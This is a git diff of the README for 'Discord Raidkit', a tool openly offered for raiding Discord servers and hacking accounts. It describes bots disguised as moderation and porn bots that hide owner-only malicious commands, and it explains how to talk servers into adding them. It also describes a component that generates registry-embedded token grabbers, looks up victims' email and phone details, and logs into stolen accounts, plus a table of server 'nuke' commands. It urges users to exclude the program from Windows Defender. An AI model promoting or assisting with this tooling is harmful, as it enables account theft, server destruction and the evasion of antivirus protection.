@@ -1,6 +1,6 @@
 # Discord Raidkit
 
-⚠ Windows Defender now reports this program as malware - this is a false positive and can be ![excluded](https://support.microsoft.com/en-us/windows/add-an-exclusion-to-windows-security-811816c0-4dfd-af4a-47e4-c301afe13b26#:~:text=Go%20to%20Start%20%3E%20Settings%20%3E%20Update,%2C%20file%20types%2C%20or%20process.)! ⚠
+⚠ Windows Defender now reports this program as malware - this is a false positive and can be [excluded](https://support.microsoft.com/en-us/windows/add-an-exclusion-to-windows-security-811816c0-4dfd-af4a-47e4-c301afe13b26#:~:text=Go%20to%20Start%20%3E%20Settings%20%3E%20Update,%2C%20file%20types%2C%20or%20process.)! ⚠
 
 ![Discord Raidkit v2.3.4 image](https://user-images.githubusercontent.com/98130822/222992322-ececffd1-ae6d-4d1e-bbc5-a4d6dead6f48.png)
 
@@ -17,35 +17,31 @@
 
 #### What is Discord Raidkit?
 
-Discord Raidkit is a free and open-source compilation of tools designed for raiding Discord servers and hacking accounts. It focuses on social engineering and includes non-malicious commands to assist with that.
+Discord Raidkit is a compilation of useful tools to help you raid discord servers and hack discord accounts. What sets Discord Raidkit apart from other similar projects is its emphasis on social engineering — Discord Raidkit is *the* raidkit for anyone looking to convince servers to add bots. 
 
-#### Why choose Discord Raidkit?
+#### Why choose Discord Raidkit over similar programs?
+There are several reasons to choose Discord raidkit over similar programs:
+- Unlike many raiders, Discord Raidkit is free and open-source.
+- Unlike many raiders, Discord Raidkit comes with fully functional, non-malicious commands to further aid in social engineering.
+- Unlike many raiders, Discord Raidkit is professionally written for performance, running far faster than some other programs.
 
-Discord Raidkit stands out from similar programs because it is free, open-source, and has professionally written code that runs faster than competitors. It is kept up to date and evolves with Discord, using new features such as slash commands.
+#### What tools are included in Discord Raidkit?
 
-#### Tools included in Discord Raidkit
+- **Anubis** is a moderation bot that comes with genuine server management commands and some utility commands, like bans and timeouts. Keep note of this when attempting to convince a moderation team to add the bot. Hidden malicious commands can be accessed by the bot owner only (typically you) once added.
 
-Discord Raidkit includes:
+- **Qetesh** is a fully functional porn bot with over 10,000 images, channel management, and 25 commands. Qetesh is an easy bot to add to most NSFW servers, as many will blindly add whatever porn bot is requested by their members. Like Anubis, hidden malicious commands can be accessed by the bot owner only once added.
 
-- **Anubis**: A moderation bot with genuine server management commands and hidden malicious commands accessible only by the bot owner.
-
-- **Qetesh**: A fully functional porn bot with over 10,000 images and hidden malicious commands accessible only by the bot owner. Images are stored as CDN links in a generated database to drastically improve command-to-render speed.
-
-- **Osiris**: A user authentication token handler that can generate token grabbers to embed within Windows registries, father information about a token, and log into an account with just one selenium script. **To use Osiris, you must include [this browser folder](https://drive.proton.me/urls/7898MKJM2W#LIrqn3KDFmsi) - put it in the same directory as `main.py`!**
+- **Osiris** is a user authentication token handler. With Osiris, you can generate token grabbers that have been adapted to embed themselves within Windows registries, look up information about a token such as the email address and phone number attatched to it, fill up the users server count and mess with their settings, as well as log into an account with just one selenium script.
 
 ---
 
 ### Installation
+As of v2.3.5, installation is as easy as ever!
+- Visit the [releases page](https://github.com/the-cult-of-integral/discord-raidkit/releases) and download the latest version - for easy installation, download the `.exe`!
 
-To install Discord Raidkit:
+- Run `Discord Raidkit v2.3.5.exe` - it would be wise to run this from the command line to catch any errors that the logger may miss!
 
-- Download the latest version from the [releases page](https://github.com/the-cult-of-integral/discord-raidkit/releases/latest).
-
-- Run the `install_requirements` script for your operating system.
-
-- Start the program by running `main.py`.
-
-- Ensure that you have Python 3.10.0+ installed — be sure to check "Add to PATH" during installation!
+*Technical users who wish to develop this repository may download the `.py` zip; run the `install_requirements` for your OS to get started.*
 
 ---
 
@@ -64,18 +60,13 @@ To install Discord Raidkit:
 | mass_nuke | massnuke, nuke_all, nukeall | --- | perform the nuke command on every server the bot is in, one by one |
 | leave | --- | --- | leave a server |
 | mass_leave | massleave, leave_all, leaveall | --- | leave every server |
-
 ---
 
 ### Repo
 
-#### Known Issues
+#### Known Issues (v2.3.5)
 
-- Osiris' ability to create up to 200 servers during an account nuke is broken due to Discord API changes. Attempting to fix but Discord's API has barely any reliable documentation. If anyone has any *good* documentation, let me know!
-
-- Osiris' account information display looks a bit weird due to a missing new line character here are there. This is an easy fix.
-
-- *I have seen the three issues discussing bots being unable to load. However, I am unable to reproduce them myself.*
+- None - *for anyone curious as to why the program exits if you exit Anubis or Qetesh with `CTRL+C`, then going back into either Anubis or Qetesh, this is because, as far as I can tell, Discord does not allow a connected bot to be terminated and opened again within the same process. If anyone more experienced knows how to deal with this, you contributions are appreciated!*
 
 #### Repository Milestones
 
